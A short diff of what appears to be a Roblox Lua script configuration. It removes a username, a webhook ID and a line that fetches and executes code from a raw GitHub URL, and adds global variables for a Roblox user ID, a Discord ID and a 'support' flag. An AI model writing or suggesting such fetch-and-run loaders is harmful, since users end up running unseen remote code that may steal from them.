@@ -1,3 +1,3 @@
-Username = "123newbeginner"
-Webhook = "e266f0cd-de4d-4f48-a0ca-4b636a595ff6"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sqwzy/plsssdonate/refs/heads/main/main",true))()
+_G.UserID = 3259457015 -- change to your own roblox user id
+_G.discuser = "251453072872570880" -- change to your discord id
+_G.support = "False" -- change to "False" if you dont wanna support me
